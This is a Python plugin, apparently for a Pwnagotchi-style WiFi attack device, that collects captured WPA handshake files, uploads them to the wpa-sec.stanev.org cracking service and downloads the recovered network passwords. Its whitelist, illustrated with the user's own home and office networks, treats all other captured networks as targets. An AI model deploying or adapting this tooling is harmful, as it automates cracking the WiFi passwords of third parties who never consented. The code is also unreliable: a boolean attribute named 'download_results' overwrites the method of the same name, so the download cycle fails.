#!/usr/bin/env python3
"""
WPA-Sec Plugin Configuration for PwnBullseye4
Handles handshake uploads to wpa-sec.stanev.org
"""

import os
import json
import logging
import requests
import hashlib
import hmac
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime

logger = logging.getLogger(__name__)


class WPASecPlugin:
    """
    WPA-Sec plugin for automatic handshake upload
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config.get('plugins', {}).get('wpa-sec', {})
        self.enabled = self.config.get('enabled', False)
        self.api_key = self.config.get('api_key', '')
        self.api_url = self.config.get('api_url', 'https://wpa-sec.stanev.org')
        self.download_results = self.config.get('download_results', False)
        self.whitelist = self.config.get('whitelist', [])
        self.handshake_dir = Path(config.get('bettercap', {}).get('handshakes', '/root/handshakes'))
        
        # State tracking
        self.uploaded_hashes = set()
        self.last_check = 0
        self.check_interval = 300  # 5 minutes
        
    def is_enabled(self) -> bool:
        return self.enabled and bool(self.api_key)
        
    def should_upload(self, handshake_path: Path) -> bool:
        """Check if handshake should be uploaded"""
        if not self.is_enabled():
            return False
            
        # Check whitelist
        if self._is_whitelisted(handshake_path):
            return False
            
        # Check if already uploaded
        file_hash = self._file_hash(handshake_path)
        if file_hash in self.uploaded_hashes:
            return False
            
        return True
        
    def _is_whitelisted(self, handshake_path: Path) -> bool:
        """Check if handshake is whitelisted"""
        try:
            # Parse handshake filename for BSSID/ESSID
            # Format: handshake_ESSID_BSSID_timestamp.pcap
            name = handshake_path.stem
            for wl in self.whitelist:
                if wl.lower() in name.lower():
                    return True
        except Exception:
            pass
        return False
        
    def _file_hash(self, path: Path) -> str:
        """Calculate SHA256 hash of file"""
        sha256 = hashlib.sha256()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                sha256.update(chunk)
        return sha256.hexdigest()
        
    def upload_handshake(self, handshake_path: Path) -> bool:
        """Upload handshake to WPA-Sec"""
        if not self.is_enabled():
            logger.debug("WPA-Sec not enabled or no API key")
            return False
            
        if not handshake_path.exists():
            logger.warning(f"Handshake file not found: {handshake_path}")
            return False
            
        try:
            logger.info(f"Uploading handshake to WPA-Sec: {handshake_path.name}")
            
            # Read PCAP file
            with open(handshake_path, 'rb') as f:
                pcap_data = f.read()
                
            # Prepare upload
            files = {
                'file': (handshake_path.name, pcap_data, 'application/vnd.tcpdump.pcap')
            }
            data = {
                'key': self.api_key
            }
            
            # Upload
            response = requests.post(
                f"{self.api_url}/api/upload",
                files=files,
                data=data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    logger.info(f"Upload successful: {result.get('message', 'OK')}")
                    self.uploaded_hashes.add(self._file_hash(handshake_path))
                    return True
                else:
                    logger.error(f"Upload failed: {result.get('message', 'Unknown error')}")
            else:
                logger.error(f"HTTP error: {response.status_code} - {response.text}")
                
        except requests.exceptions.Timeout:
            logger.error("Upload timeout")
        except requests.exceptions.RequestException as e:
            logger.error(f"Upload request failed: {e}")
        except Exception as e:
            logger.exception(f"Unexpected error during upload: {e}")
            
        return False
        
    def download_results(self) -> Optional[List[Dict]]:
        """Download cracked passwords from WPA-Sec"""
        if not self.is_enabled() or not self.download_results:
            return None
            
        try:
            response = requests.post(
                f"{self.api_url}/api/results",
                data={'key': self.api_key},
                timeout=30
            )
            
            if response.status_code == 200:
                results = response.json()
                if results.get('success'):
                    return results.get('results', [])
                else:
                    logger.error(f"Results download failed: {results.get('message')}")
                    
        except Exception as e:
            logger.exception(f"Failed to download results: {e}")
            
        return None
        
    def process_results(self, results: List[Dict]) -> List[Dict]:
        """Process and format downloaded results"""
        processed = []
        for r in results:
            processed.append({
                'essid': r.get('essid', ''),
                'bssid': r.get('bssid', ''),
                'password': r.get('password', ''),
                'cracked_at': r.get('cracked_at', ''),
                'source': 'wpa-sec'
            })
        return processed
        
    def scan_handshakes(self) -> List[Path]:
        """Scan handshake directory for new files"""
        handshakes = []
        if self.handshake_dir.exists():
            for ext in ['.pcap', '.pcapng', '.cap', '.hccapx']:
                handshakes.extend(self.handshake_dir.glob(f'*{ext}'))
        return handshakes
        
    def run_upload_cycle(self) -> int:
        """Run one upload cycle - scan and upload new handshakes"""
        if not self.is_enabled():
            return 0
            
        uploaded = 0
        handshakes = self.scan_handshakes()
        
        for hs in handshakes:
            if self.should_upload(hs):
                if self.upload_handshake(hs):
                    uploaded += 1
                    
        return uploaded
        
    def run_download_cycle(self) -> Optional[List[Dict]]:
        """Run one download cycle"""
        if not self.is_enabled() or not self.download_results:
            return None
            
        results = self.download_results()
        if results:
            return self.process_results(results)
        return None


def create_plugin_config(api_key: str, 
                         api_url: str = "https://wpa-sec.stanev.org",
                         download: bool = True,
                         whitelist: List[str] = None) -> Dict[str, Any]:
    """Create WPA-Sec plugin configuration"""
    return {
        'enabled': True,
        'api_key': api_key,
        'api_url': api_url,
        'download_results': download,
        'whitelist': whitelist or []
    }


def add_to_defaults(defaults_toml: str, api_key: str = "") -> str:
    """Add WPA-Sec config to defaults.toml"""
    wpa_sec_config = f"""
main.plugins.wpa-sec.enabled = true
main.plugins.wpa-sec.api_key = "{api_key}"
main.plugins.wpa-sec.api_url = "https://wpa-sec.stanev.org"
main.plugins.wpa-sec.download_results = true
main.plugins.wpa-sec.whitelist = []
"""
    return defaults_toml + wpa_sec_config


if __name__ == "__main__":
    # Test configuration
    import sys
    
    logging.basicConfig(level=logging.INFO)
    
    # Example usage
    test_config = {
        'plugins': {
            'wpa-sec': {
                'enabled': True,
                'api_key': 'YOUR_API_KEY_HERE',
                'api_url': 'https://wpa-sec.stanev.org',
                'download_results': True,
                'whitelist': ['MyHomeNetwork']
            }
        },
        'bettercap': {
            'handshakes': '/root/handshakes'
        }
    }
    
    plugin = WPASecPlugin(test_config)
    
    if plugin.is_enabled():
        print("WPA-Sec plugin configured and enabled")
        print(f"API URL: {plugin.api_url}")
        print(f"Handshake dir: {plugin.handshake_dir}")
    else:
        print("WPA-Sec plugin not enabled or missing API key")
        
    # Create example config
    example = create_plugin_config(
        api_key="YOUR_API_KEY_HERE",
        whitelist=["HomeNetwork", "OfficeWiFi"]
    )
    print("\nExample configuration:")
    print(json.dumps(example, indent=2))